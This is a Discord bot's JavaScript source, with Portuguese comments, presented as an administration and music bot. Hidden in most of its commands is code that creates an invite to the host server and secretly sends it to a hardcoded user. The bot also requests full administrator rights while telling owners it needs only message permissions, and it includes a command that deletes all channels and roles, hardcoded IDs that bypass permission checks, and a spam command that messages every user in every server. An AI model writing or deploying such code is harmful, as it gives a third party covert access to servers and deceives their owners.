//BOT COM MULTIPLAS FUNÇÕES,FAVOR USAR COM RESPONSABILIDADE! By:@xgsa
const weather = require(`weather-js`);
const Discord = require("discord.js"),
 client = new Discord.Client({
    autoReconnect: true,
    messageCacheMaxSize: 2024,
    fetchAllMembers: true,
    disabledEvents: ['typingStart', 'typingStop', 'guildMemberSpeaking'],
    messageCacheLifetime: 1680,
    disableEveryone: true,
    messageSweepInterval: 1680
});  
const queue = new Map();
const ytdl = require('ytdl-core');
const config = require("./config.json");

client.on("guildCreate", guild => {
  console.log(`Eu fui Adicionado do seguinte servidor : ${guild.name} (id: ${guild.id})`);
  client.user.setActivity(`🔔 Prefix: ! , Estou em  ${client.guilds.size} Servidores! - de !help para saber meus comandos de administração e /help para saber como escutar musica! 👽`);
});

client.on("guildDelete", guild => {
  console.log(`Eu fui removido do seguinte servidor : ${guild.name} (id: ${guild.id})`);
  client.user.setActivity(`🔔 Prefix: ! , Estou em  ${client.guilds.size} Servidores! - de !help para saber meus comandos de administração e /help para saber como escutar musica! 👽`);
});

client.on('guildMemberAdd', async member => {
  console.log(`${member.user.tag} entrou no servidor ${member.guild.name}.`);
    member.send(`Olá ${member.user.tag} Tudo bom? sou um bot de Administração e divulgação. Quer me Colocar no seu grupo? acesse : https://discord.com/oauth2/authorize?client_id=671912522689019915&scope=bot&permissions=8 \n meu discord: https://discord.gg/5FNznvE`)
    .catch(error => console.log(`Erro ao enviar mensagem para ${member.user.tag}.`));
});


client.login(config.token);

console.log('Iniciando... by:@xgsa (Gsa)')

client.on("ready", () => {
  console.log(`O Bot Foi iniciado com ${client.users.size} usuarios, em ${client.channels.size} Canais ,em ${client.guilds.size} servidores. criado por @xgsa Discord.js: ${Discord.version} `);
  let usuarios = client.users.size
  client.user.setActivity(`🔔 de !help para saber meus comandos de administração e /help para saber como escutar musica!👽`);
});
 

//BOT começa a partir daqui!




client.on("message", async message => {
  if(message.author.bot) return;
  if(message.content.indexOf(config.prefix) !== 0) return;
  const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();  
// para verificar a latencia do bot (até 220 é aceitavel!)
if(command === "ping") {
  console.log(`Comando ping Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **ping** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
    message.delete();
    let embed = new Discord.RichEmbed()

    .setTitle("🤖 Ping do bot")
    .setColor("BLACK")
    .setDescription(`**O ping do bot é de ${Math.round(client.ping)}ms!**`)
    .setThumbnail("https://cdn.discordapp.com/attachments/559509927354433551/585683011823992832/ezgif.com-resize.gif")

    message.channel.send(embed);
}
// um texto sobre o bot
if (command === "bot"){
  console.log(`comando de descobrimento de bot foi executado por ${message.author.username}`);
let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **bot** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
  message.delete();
 let embed = new Discord.RichEmbed()

 .setTitle('GsaBot v2.0')
 .setDescription('**Sou um bot de Administração e Musica**')
 .addField('Me adicione em seu servidor:', `**[Clique aqui](discord.com/oauth2/authorize?client_id=671912522689019915&scope=bot&permissions=8)**`)
 .addField('Caso você esteja pensando:', `**"Nossa ele tem permissão de adm ele vai derrubar meu servidor."**\n` +`Se estiver com medo é só tirar as minhas permissões pois preciso só das permissões de:\n` +`**Ler, escrever e gerenciar mensagens.**`)
 .addField('Informações:',`Use **!help** e **/help** para saber mais.`)
 .addField('Duvidas?',`de !ticket e mande a mensagem para o dono do bot (Gsa)`)
 .setColor('WHITE')

 message.channel.send(embed);
}
// pra resetar o servidor
if (command === "resetr"){
  console.log("usaram o RESET EM UM SERVIDOR!!!!!!!! CUIDADO")
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **Resetr** CUIDADO Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
      message.delete()
      if(!message.member.hasPermission("ADMINISTRATOR") && message.author.id !== '287696585427779584' && message.author.id !== '287696585427779584') return message.reply("| você não possui permissão para usar esse comando.")
     const Discord = require('discord.js')
     var canal = message.guild.channels.array();
     for (let i = 0; i < canal.length; ++i)
       {
       if (!canal[i]) return;
 
       canal[i].delete().catch(err=>console.log(err));
       }
     var roles = message.guild.roles.array();
      for (let i = 0; i < roles.length; ++i)
      {
       if (!roles[i]) return;
 
       roles[i].delete().catch(err=>console.log(err));
      }
      message.guild.createChannel('server-resetado-com-sucesso')   
}
// Para ver as informações do usuario//
if (command === "userinfo"){
   console.log(`Comando userinfo Executado! por ${message.author.username}`);
   let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **userinfo** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
    let inline = true
    let resence = true
    const status = {
        online: "Online",
        idle: "Ausente",
        dnd: "Ocupado",
        offline: "Offline/Invisivel"
      }
        
       const member = message.mentions.members.first() || message.guild.members.get(args[0]) || message.member;
       let target = message.mentions.users.first() || message.author

       if (member.user.bot === true) {
       bot = "Sim";
       } else {
        bot = "Não";
          }

            let embed = new Discord.RichEmbed()
                //.setAuthor(member.user.username)
                .setThumbnail((target.displayAvatarURL))
                .setColor("#00ff00")
                .addField("Nome", `${member.user.tag}`, inline)
                .addField("ID", member.user.id, inline)
                .addField("Apelido", `${member.nickname !== null ? `Apelido: ${member.nickname}` : "Nenhum"}`, true)
                .addField("Bot", `${bot}`,inline, true)
                .addField("Status", `${status[member.user.presence.status]}`, inline, true)
                .addField("Jogando", `${member.user.presence.game ? `🎮 ${member.user.presence.game.name}` : "Não está jogando"}`,inline, true)
                .addField("Cargos", `${member.roles.filter(r => r.id !== message.guild.id).map(roles => `\`${roles.name}\``).join(" **|** ") || "Sem cargos"}`, true)
                .addField("Entrou no discord", member.user.createdAt)
                .setFooter(`Informações de ${member.user.username}`)
                .setDescription(`**Clique [aqui](discord.com/oauth2/authorize?client_id=671912522689019915&scope=bot&permissions=8) para adicionar o **bot** em seu servidor!**`)
                .setTimestamp()
    
            message.channel.send(embed);

            message.delete();
    }
// Temperatura 
if (command === "temperatura"){
    let args = message.content.split(/[ ]+/);
    weather.find({ search: args.slice(1).join(' '), degreeType: 'C' }, function (err, result) { 
        if (err) console.log('Weather CMD error: ' + err);
        if (result === undefined || result.length === 0) {
            message.channel.send({
                embed: {
                    color: 0xff2727,
                    description: `:warning: **${message.author.username}**, Fale uma Localização Valida! ex: !weather São paulo,Brasil .`,
                    footer: {
                        text: 'API Lantancy is ' + `${Date.now() - message.createdTimestamp}` + ' ms',
                    }
                }
            });
            return;
        }

        var current = result[0].current;
        var location = result[0].location;

        let embed = new Discord.RichEmbed()
            .setAuthor(` [${current.skytext}] Temperatura em : ${current.observationpoint}`, current.imageUrl)
            .setColor(0xffffff)
            .addField('Timezone', `UTC${location.timezone}`, true)
            .addField('tipo de grau', location.degreetype, true)
            .addField('Temperatura', `${current.temperature} Graus`, true)
            .addField('Parece', `${current.feelslike} Degrees`, true)
            .addField('Ventos', current.winddisplay, true)
            .addField('Umidade', `${current.humidity}%`, true);
        message.channel.send({ embed });
        return message.react("👌");
    });
};
// mandar mensagem para todos em embed//
if(command === "allembed"){
  console.log(`Comando allembed Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **allembed** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
  if(!message.member.hasPermission("ADMINISTRATOR") && message.author.id !== '287696585427779584' && message.author.id !== '287696585427779584') return message.reply("| você não possui permissão para usar esse comando.")
    var separador = message.content.split("|")
    const Embed = new Discord.RichEmbed()
    .setTitle(separador[1])
    .setColor("BLACK")
    .setThumbnail(Sender.displayAvatarURL)
    .setDescription(separador[2])
    .setImage(separador[3])
    message.channel.send(Embed)
    try{

    messsage.channel.send(Embed);

 }catch(err){

    return message.reply("**Ocorreu um erro. Por favor, tente novamente.**")

    }
   const membros = message.guild.memberCount;
   try{
    message.guild.members.map(membro => {
         membro.send(Embed).catch(() => {});
    })
 }catch(err){

    return message.reply("**:chegay: *\`Ocorreu um erro ao enviar a mensagem. Tente novamente.\`\*")

   }
    message.channel.send("*\`Mensagem enviada para\`\* ***`" + membros + "`*** *\`membros\`\*")
    message.channel.send("**`Mensagem a ser enviada:`**")
}
//Para ver todos os comandos//
if(command === "help") {
  console.log(`Comando help Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **Help** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
  
  message.channel.send({embed:{
  title: "Lista de comandos:",
  description: `${message.author} o meu *Prefix*  é : **!** 
   e os *Comandos* são :
  **!help** (para visualizar todos os comandos do bot);

  **!convite** (para criar um convite do seu servidor);

  **!serverinfo**(para ver a informação do servidor);

  **!lock** (para que ninguem mande mensagem em uma sala expecifica);

  **!unlock** (para desbloquar a sala que foi bloqueada);

  **!ping** (para ver a Latencia do bot);

  **!userinfo** (para ver a informação de algum jogador)

  **!clear** de 1 a 100(de esse comando para limpar as mensagens do seu server);

  **!kick** para dar kick em algum membro *(Tem que ser Administrador do server);*

  **!ban** para banir algum membro *(Tem que ser Administrador do server);*

  **!status** Status do bot (quantidade de usuarios,servidores etc...);

  **!link** (para pegar o link do bot );

  **!discord** (para pegar o link do DISCORD do bot);

**!Temperatura** para saber a temperatura de uma cidade **ex: !temperatura São Paulo,Brasil**

  **!anunciar** *(Tem que ser Administrador do server)*;

  **!Convite** Para criar um convite do servidor (link)
  
  *AVISOS:*
  **Para divulgação premium : Chame @xgsa (20$ ou nitro)**
  **Para Chamar o dono do bot de : !ticket**
  **Para ter o Contador Chame o ** @xgsa ** e Solicite o mesmo!**
 
 *UPDATE:*
 _FOI ADICIONADO O BOT DE MUSICA (De /Help para saber os comandos!) _`,
  timestamp: new Date()
  }})
 }
//para criar um convite de algum servidor
if (command === "convite") {
  console.log(`Comando convite Executado! por ${message.author.username} em ${message.guild.name}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **convite** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
    if(!message.member.hasPermission('CREATE_INSTANT_INVITE')) {
        return message.channel.send(`<a:nao:594960419832070162> | ${message.author} Me parece que você não tem permissão de criar convites no servidor.`)
    }
    try {
    const invite = await message.channel.createInvite({maxAge: 0});

    message.reply(`:incoming_envelope: **Convite Criado:** \n ${invite}`)
    } catch (err) {
    message.reply(`**<a:FBTriste:594960155607695374> | ${message.author} Por algum motivo eu não tenho permissão de criar convites nesse servidor.**`)
   }
}
//Ver as informações do servidor
if (command === "serverinfo") {
  console.log(`Comando serverinfo Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **serverinfo** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
    function checkDays(date) {
        let now = new Date();
        let diff = now.getTime() - date.getTime();
        let days = Math.floor(diff / 86400000);
        return days + (days == 1 ? " day" : " days") + " ago";
    };
    let verifLevels = ["None", "Low", "Medium", "(╯°□°）╯︵  ┻━┻", "┻━┻ミヽ(ಠ益ಠ)ノ彡┻━┻"];
    let region = {
        "brazil": ":flag_br: Brazil",
        "eu-central": ":flag_eu: Central Europe",
        "singapore": ":flag_sg: Singapore",
        "us-central": ":flag_us: U.S. Central",
        "sydney": ":flag_au: Sydney",
        "us-east": ":flag_us: U.S. East",
        "us-south": ":flag_us: U.S. South",
        "us-west": ":flag_us: U.S. West",
        "eu-west": ":flag_eu: Western Europe",
        "vip-us-east": ":flag_us: VIP U.S. East",
        "london": ":flag_gb: London",
        "amsterdam": ":flag_nl: Amsterdam",
        "hongkong": ":flag_hk: Hong Kong",
        "russia": ":flag_ru: Russia",
        "southafrica": ":flag_za:  South Africa"
    };
    const embed = new Discord.RichEmbed()
        .setAuthor(message.guild.name, message.guild.iconURL)
        .addField("Nome", message.guild.name, true)
        .addField("ID", message.guild.id, true)
        .addField("Dono", `${message.guild.owner.user.username}#${message.guild.owner.user.discriminator}`, true)
        .addField("Região", region[message.guild.region], true)
        .addField("Total | Humanos | Bots", `${message.guild.members.size} | ${message.guild.members.filter(member => !member.user.bot).size} | ${message.guild.members.filter(member => member.user.bot).size}`, true)
        .addField("Canais", message.guild.channels.size, true)
        .addField("Cargos", message.guild.roles.size, true)
        .addField("Data de criação", `${message.channel.guild.createdAt.toUTCString().substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`, true)
        .setDescription(`**Clique [aqui](discord.com/oauth2/authorize?client_id=671912522689019915&scope=bot&permissions=8) para adicionar o **bot** em seu servidor!**`)
        .setThumbnail(message.guild.iconURL)
    message.channel.send({embed});
}
//Para que o Cliente mande mensagem para ti , pelo bot
if (command === "ticket"){
  console.log(`Comando suporte Executado! por ${message.author.username}`);
    let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
    let Sender = message.author;
    const sayMessage = args.join(" ");
  if(!sayMessage) return message.channel.send("Por favor, coloque um motivo para o contato ex: !ticket <motivo> ").then(msg => {msg.delete(5000)});

   let contato = new Discord.RichEmbed()
   .setColor("00ff00")
   .setThumbnail(Sender.displayAvatarURL)
   .setDescription(`Mensagem de contato de [${message.guild.name}](${Invite.url})`)
   .setTitle("Mensagem do comando de contato!")
   .addField("User", Sender, true)
   .addField("User ID: ", Sender.id, true)
   .addField("Message: ", sayMessage)
   .setTimestamp()

    let embed = new Discord.RichEmbed()
    .setColor("#00ff00")
    .setTitle("Mensagem enviada!")
    .setDescription("Sua mensagem de contato foi enviada!")
    .addField("Pedido por: ", Sender)
    .addField("Mensagem: ", sayMessage)
    .setFooter("Obrigado por entrar em contato com o suporte!")

    message.channel.send(embed).then(msg => {msg.delete(10000)});
    client.users.get("284466671257780237").send(contato);
        message.delete()
  }
// Lista de servidores
if (command === "serverlist") {
  console.log(`Comando ServerList Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **ServerList** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
    message.author.send(`Servidores: (${client.guilds.size}):\n\n${client.guilds.map(a => `- ${a.name} (${a.members.size} usuários link: ${Invite.url})`).join(",\n")}`)
    message.channel.send("**Mandei a lista de servidores no seu privado !**")
 }
// link do bot
if (command === "link"){
  console.log(`Comando link Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **link** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
    let embed = new Discord.RichEmbed()

    .setTitle("🤖 Convite do bot")
    .setColor("BLACK")
    .setDescription(`**Clique [aqui](https://discord.com/oauth2/authorize?client_id=671912522689019915&scope=bot&permissions=8) para adicionar o bot em seu servidor.**`)
    .setFooter(`${client.user.username}`, client.user.avatarURL)
    .setTimestamp()

    message.channel.send(embed);
}
// comando pra zoar o fall2
if (command === "fall2"){
  console.log(`Comando fall Executado por ${message.author.username}`);
  
  message.channel.send("https://cdn.discordapp.com/attachments/645716185954123776/683736749654016235/1.png")
}
// comando para zoar o fall
if (command === "fall"){
  console.log(`Comando fall executado por ${message.author.username}`);
  
  message.channel.send("https://cdn.discordapp.com/attachments/630180190475255838/683736542958977150/pp.png")
}
// comando pra zoar o fall
if(command === "rust"){
  console.log(`Comando rust Executado Por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **FallRust** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
  message.channel.send("https://media.discordapp.net/attachments/511234811697037312/683739750330662950/fall.png?width=336&height=351")
}
// para banir um usuario
if (command === "ban") {
  console.log(`Comando ban Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **BAN** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
   if(!message.member.hasPermission("ADMINISTRATOR")) return;
   var member= message.mentions.members.first();
   member.ban().then((member) => {
   message.channel.send({embed: {
   title: "Banido com sucesso!",
   description: ` :wave:  + member.displayName + " Banido com sucesso!:point_right:`,
   timestamp: new Date()
   }})
   }).catch(() => {
   message.channel.send("Sem Permissão!");
   });
  }
// para expulsar um usuario
if (command === "kick") {
  console.log(`Comando kick Executado! por ${message.author.username}`);
  
   if(!message.member.hasPermission("ADMINISTRATOR")) return;
   var member= message.mentions.members.first();
   member.kick().then((member) => {
   message.channel.send(":wave: " + member.displayName + "kickado com sucesso! :point_right: ");
   }).catch(() => {
   message.channel.send("Sem Permissão!");
   });
  }
// para trancar uma chat de conversa
if (command === "lock") {
  console.log(`Comando Lock Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **LOCK** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
    if(!message.member.hasPermission('MANAGE_MESSAGES')) {
        return message.channel.send(`${message.author} você não possui permissão para usar esse comando.`)
        
      }
      var lock = message.guild.roles.find("name","@everyone")
      message.channel.overwritePermissions(lock, {
        SEND_MESSAGES: false
      });
       
      message.channel.send(`O canal ${message.channel} foi __bloqueado__ com sucesso.`);
  }
// Só usa se você sabe mecher...
if (command === "profilebot"){
  console.log(`Comando profilebot Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **profilebot** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
  if(!message.member.hasPermission("ADMINISTRATOR") && message.author.id !== '284466671257780237') return message.reply(":x:  | você não possui permissão para usar esse comando.")
 message.reply("Estou sendo divulgado...").then(msg => msg.delete(8000))
  message.delete()
  const membros = message.guild.memberCount;
  let barry = client.users.get('284466671257780237')
  let autor = message.author
 const Gsa = new Discord.RichEmbed()
 .setTitle('GsaBot v2.0')
 .setDescription('**Olá Eu sou um bot de Administração e Musica**')
 .setThumbnail(client.user.avatarURL)
 .addField('Me adicione em seu servidor:', `**[Clique aqui](discord.com/oauth2/authorize?client_id=671912522689019915&scope=bot&permissions=8)**`)
 .addField('Caso você esteja pensando:', `**"Nossa ele tem permissão de adm ele vai derrubar meu servidor."**\n` +`Se estiver com medo é só tirar as minhas permissões pois preciso só das permissões de:\n` +`**Ler, escrever e gerenciar mensagens.**`)
 .addField("Use **!help** para saber mais.", `** Para saber os comandos do bot de musica de /help **`)
 .setColor('RED')
 .setTimestamp();

      message.guild.members.map(membro => {
        membro.send(Gsa)
  
    })
 }
// destrancar um chat de conversa
if (command === "unlock"){
  console.log(`Comando unlock Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **UNLOCK** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
 if(!message.member.hasPermission('MANAGE_MESSAGES')) {
  return message.channel.send(`${message.author}, você não possui permissão para usar esse comando.`)        
      }
      var unlock = message.guild.roles.find("name","@everyone")
      message.channel.overwritePermissions(unlock, {
        SEND_MESSAGES: true
       });
       message.channel.send(`O canal ${message.channel} foi __desbloqueado__ com sucesso.`)
  }
// Anunciar uma mensagem (sem embed!)
if(command === "anunciar") {
  console.log(`Comando anunciar Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **ANUNCIAR** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
   if(!message.member.hasPermission("ADMINISTRATOR")) return;
   const sayMessage = args.join(" ");
   message.delete().catch(O_o=>{});
   message.guild.members.map((membro) => membro.send(sayMessage).catch(() => {}))
 }
// para spammar em todos os grupos
if(command === "allmembers") {
  console.log(`Comando Spam Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **SPAMPRIV8** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
   if(!message.member.hasPermission("ADMINISTRATOR")) return;
   message.delete()
   let mensagem = args.join(" ")
   let servidores = client.guilds.size
   let usuarios = client.users.size
   client.users.forEach((f) => {f.send(mensagem)},
   message.channel.send(`**${message.author} sua mensagem está sendo enviada para __${usuarios}__ usuários em __${servidores}__ servidores.**`)
  )}
// Status do Bot
if (command === "status"){
  console.log(`Comando Status Executado! por ${message.author.username}`);
  
   message.channel.send({embed: {
   title: "Status Atual do Bot:",
   description: `**${message.author.username}** Eu no momento estou com  **${client.users.size}** usuarios, em **${client.channels.size}** Canais ,em **${client.guilds.size}** servidores. Bot criado por @xgsa `,
   timestamp: new Date()
   }})
  }
// Para fazer o bot mandar mensagem
if (command === "say"){
  console.log(`Comando say Executado! por ${message.author.username}`);
 let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **SAY** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
     if(!message.member.hasPermission("ADMINISTRATOR")) return;
      const sayMessage = args.join(" ");
      message.delete().catch();
      message.channel.send(sayMessage);
  }
// Para limpar um chat de conversa , use de 1 a 100
if (command === "clear"){
  console.log(`Comando clear Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **CLEAR** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
  if(!message.member.hasPermission("ADMINISTRATOR")) return;
   message.delete().catch(O_o=>{});
   if(parseInt(args[0]) < 1 || args[0] == "" || args[0] == " " || args[0] == null) {
   message.channel.send(`**${message.author.username}** Algo deu errado , tente : !clear <numero de 1 a 100>`);
   return;
   }
   if(parseInt(args[0]) > 100) {
   message.channel.send(`**${message.author.username}** O valor maximo é 100 , tente novamente...`);
    return;
   }
   let number = parseInt(args[0]);
   message.channel.fetchMessages({limit: number}).then(messages => message.channel.bulkDelete(messages).then(
   message.channel.send({embed: {
    title: ":shower: Chat foi apagado com sucesso! :shower:",
    description: `O chat foi limpo por ${message.author.username}`,
   timestamp: new Date()
    }})
   ));
  }
// para fazer uma votação no chat de conversa
if (command === "vote"){
  console.log(`Comando vote Executado! por ${message.author.username}`);
  let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
  client.users.get("284466671257780237").send(`Comando **VOTE** Executado! por ${message.author.username} em ${message.guild.name} ${Invite.url} !`);
  if(!message.member.hasPermission("ADMINISTRATOR") && message.author.id !== '287696585427779584') return message.reply("| você não possui permissão para usar esse comando.")
   message.delete().catch();
   message.channel.send({embed: {
   title: args.join(' '),  
   footer: {
      text: `Votação iniciada por ${message.author.username}`
  },
  color: 8463563,
  timestamp: new Date()
  }}).then((message) => {
  message.react("✅");
  message.react("❌");
  });
  }
/// // // //  //  // // // // // // // // // 
});

//BOT COM MULTIPLAS FUNÇÕES,FAVOR USAR COM RESPONSABILIDADE! By:@xgsa - Finalizado com 613 linhas,26 comandos e 6 contadores de membros
 